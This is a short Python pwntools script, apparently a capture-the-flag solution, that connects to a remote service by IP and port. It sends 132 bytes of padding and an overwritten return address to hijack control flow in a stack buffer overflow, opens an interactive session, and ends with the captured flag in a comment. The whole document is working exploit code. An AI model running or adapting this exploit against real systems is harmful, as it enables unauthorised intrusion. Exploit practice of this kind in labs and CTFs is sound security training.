from pwn import *

# 218.100.84.106 9006
r = remote('218.100.84.106', 9006)

nop = shellcraft.i386.nop()
call_me_sys_call_add = 0x080484ea

r.send((b'A' * 132) + p32(call_me_sys_call_add) + p32(0x08048629))
r.interactive()

# HZ{r3t2l1b_w1ns!!}
